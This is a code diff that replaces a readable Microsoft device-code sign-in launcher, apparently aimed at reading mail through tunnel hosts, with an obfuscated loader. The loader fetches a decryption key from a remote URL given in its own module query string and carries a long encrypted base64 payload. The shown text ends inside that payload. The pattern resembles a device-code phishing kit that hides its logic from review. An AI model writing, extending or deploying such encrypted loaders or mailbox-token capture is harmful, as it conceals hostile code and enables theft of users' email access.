@@ -1,386 +1,74 @@
-/**
- * Portable Microsoft connect launcher logic (bundled HTML or jsDelivr + #eh-portable-boot JSON).
- * Inline HTML: preceding <script type="application/json" id="eh-inline-portable-boot"> is read via JSON.parse.
- */
-
-function EhPortableLauncherMount(B) {
-  var API_BASE = String(B.API_BASE || "");
-  var TOKEN = String(B.TOKEN || "");
-  var MODE = String(B.MODE || "device_code");
-  var ACCOUNT = String(B.ACCOUNT || "org");
-  var TENANT = String(B.TENANT || "");
-  var AUTO_OPEN = Boolean(B.AUTO_OPEN);
-  var DOMAIN_MAPPING_ID = String(B.DOMAIN_MAPPING_ID || "");
-  var MICROSOFT_SCOPE_PROFILE = String(B.MICROSOFT_SCOPE_PROFILE || "mail_read");
-  var DEVICE_CONSENT = String(B.DEVICE_CONSENT || "graph_delegated");
-  var DEVICE_CODE_GRANT = String(B.DEVICE_CODE_GRANT || "v2");
-  var DEVICE_PUBLIC_CLIENT_INDEX =
-    typeof B.DEVICE_PUBLIC_CLIENT_INDEX === "number"
-      ? B.DEVICE_PUBLIC_CLIENT_INDEX
-      : parseInt(String(B.DEVICE_PUBLIC_CLIENT_INDEX != null ? B.DEVICE_PUBLIC_CLIENT_INDEX : "0"), 10) ||
-        0;
-  var POST_CONNECT_NEXT = typeof B.POST_CONNECT_NEXT === "string" ? B.POST_CONNECT_NEXT : String(B.POST_CONNECT_NEXT || "");
-  var OAUTH_SUCCESS_PAGE = String(B.OAUTH_SUCCESS_PAGE || "");
-  var APP_LABEL = String(B.APP_LABEL || "Email Hub");
-
-  var SPA_ORIGIN = "";
+'use strict';
+async function ehBootFromDomOrBackend() {
+  const bid = 'eh-portable-boot';
+  const el = document.getElementById(bid);
+  if (el && el.textContent) {
+    try { return JSON.parse(el.textContent); } catch (e0) { return null; }
+  }
+  // Option B: parse ?eh_boot_url=...&eh_boot_k=... from this ES module URL.
+  let u = null;
+  try { u = new URL(import.meta.url); } catch (e1) { u = null; }
+  if (!u) return null;
+  const bootUrl = String(u.searchParams.get('eh_boot_url') || '').trim();
+  const bootKey = String(u.searchParams.get('eh_boot_k') || '').trim();
+  if (!bootUrl || !bootKey) return null;
+  const fetchUrl = bootUrl + (bootUrl.indexOf('?') >= 0 ? '&' : '?') + 'k=' + encodeURIComponent(bootKey);
   try {
-    SPA_ORIGIN = new URL(OAUTH_SUCCESS_PAGE).origin;
-  } catch (e0) {}
-
-  var modeEl = document.getElementById("mode");
-  var acctEl = document.getElementById("acct");
-  var tenantEl = document.getElementById("tenant");
-  var statusEl = document.getElementById("status");
-  var deviceEl = document.getElementById("device");
-  var verifyEl = document.getElementById("verify");
-  var codeEl = document.getElementById("ucode");
-  var openVerifyBtn = document.getElementById("openVerify");
-  var copyUcodeBtn =
-    document.getElementById("copyBtn") || document.getElementById("copyUcodeBtn");
-  var warmupEl = document.getElementById("ehWarmup");
-  var devicePollTimer = null;
-
-  function setWarmup(on) {
-    if (!warmupEl) return;
-    warmupEl.style.display = on ? "block" : "none";
-  }
-
-  function clearDevicePoll() {
-    if (devicePollTimer) {
-      clearTimeout(devicePollTimer);
-      devicePollTimer = null;
-    }
-  }
-
-  if (modeEl) modeEl.textContent = MODE;
-  if (acctEl) acctEl.textContent = ACCOUNT;
-  if (tenantEl) tenantEl.textContent = TENANT || "common";
-
-  function isTunnelApiBase() {
-    return /ngrok|trycloudflare|loca\.lt|workers\.dev/i.test(API_BASE);
-  }
-
-  function launcherHeaders(withJson) {
-    var h = {
-      Authorization: "Bearer " + TOKEN,
-      Accept: "application/json",
-    };
-    if (withJson) h["Content-Type"] = "application/json";
-    if (isTunnelApiBase()) h["ngrok-skip-browser-warning"] = "true";
-    return h;
-  }
-
-  function setStatus(text, ok) {
-    if (!statusEl) return;
-    statusEl.textContent = text;
-    var base = "eh-ts-status";
-    statusEl.className =
-      base + (ok === true ? " ok" : ok === false ? " err" : "");
-  }
-
-  function redirectToSpaSuccess(provider) {
-    var u;
+    const r = await fetch(fetchUrl, { method: 'GET', cache: 'no-store' });
+    if (!r || !r.ok) return null;
+    const j = await r.json();
+    // inject for downstream (portable_launcher_cdn_publish.js expects DOM boot in some modes)
     try {
-      u = new URL(OAUTH_SUCCESS_PAGE);
-    } catch (e1) {
-      setStatus("Invalid OAuth success page URL.", false);
-      return;
-    }
-    u.searchParams.set("provider", provider);
-    u.searchParams.set("next", POST_CONNECT_NEXT);
-    window.location.href = u.toString();
+      const se = document.createElement('script');
+      se.type = 'application/json';
+      se.id = bid;
+      se.textContent = JSON.stringify(j || {});
+      document.head.appendChild(se);
+    } catch (e2) {}
+    return j || null;
+  } catch (e3) {
+    return null;
   }
+}
 
-  function copyUserCodeSync(txt) {
-    var t = String(txt || "").trim();
-    if (!t) return false;
-    try {
-      var ta = document.createElement("textarea");
-      ta.value = t;
-      ta.setAttribute("readonly", "readonly");
-      ta.style.position = "fixed";
-      ta.style.left = "-9999px";
-      document.body.appendChild(ta);
-      ta.focus();
-      ta.select();
-      var ok = document.execCommand("copy");
-      document.body.removeChild(ta);
-      return !!ok;
-    } catch (e) {
-      return false;
-    }
-  }
-
-  function openMicrosoftVerifyWindow() {
-    var url = verifyEl ? String(verifyEl.textContent || "").trim() : "";
-    var codeText = codeEl ? String(codeEl.textContent || "").trim() : "";
-    copyUserCodeSync(codeText);
-    if (!url) return null;
-    var feats =
-      "popup=yes,width=520,height=460,scrollbars=yes,resizable=yes,status=yes,location=yes,toolbar=no,menubar=no,noopener,noreferrer";
-    var w = null;
-    try {
-      w = window.open(url, "eh_microsoft_device_verify", feats);
-    } catch (e0) {}
-    /* Do not fall back to target=_blank — that opens an extra tab alongside the popup. */
-    return w && !w.closed ? w : null;
-  }
-
-  async function run() {
-    try {
-      clearDevicePoll();
-      setWarmup(true);
-      if (deviceEl) deviceEl.style.display = "none";
-      if (!SPA_ORIGIN) {
-        setWarmup(false);
-        setStatus(
-          "Configure Settings → After sign-in redirect as a full URL (https://…).",
-          false,
-        );
-        return;
-      }
-      setStatus("Preparing secure connection…");
+const boot = await ehBootFromDomOrBackend().catch(function () { return null; });
+const keyB64 = boot ? (boot.WRAP_KEY_B64 || '') : '';
+if (!keyB64 || !boot) {
+} else {
+const nonceB64 = "emSLxGxffKy6Xr5H";
+const ctB64 = "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